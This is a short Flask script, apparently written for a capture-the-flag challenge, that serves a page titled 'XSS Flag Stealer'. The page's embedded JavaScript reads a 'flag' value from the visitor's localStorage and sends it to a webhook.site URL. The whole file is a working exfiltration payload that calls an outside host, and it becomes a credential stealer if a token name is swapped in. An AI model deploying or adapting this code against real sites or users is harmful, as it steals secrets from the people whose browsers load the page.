from flask import Flask, Response

app = Flask(__name__)

@app.route('/')
def steal_flag():
    html = """
    <!DOCTYPE html>
    <html>
      <head><title>XSS Flag Stealer</title></head>
      <body>
        <script>
          const flag = localStorage.getItem("flag");
          fetch("https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf/?flag=" + encodeURIComponent(flag));
        </script>
      </body>
    </html>
    """
    return Response(html, mimetype='text/html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
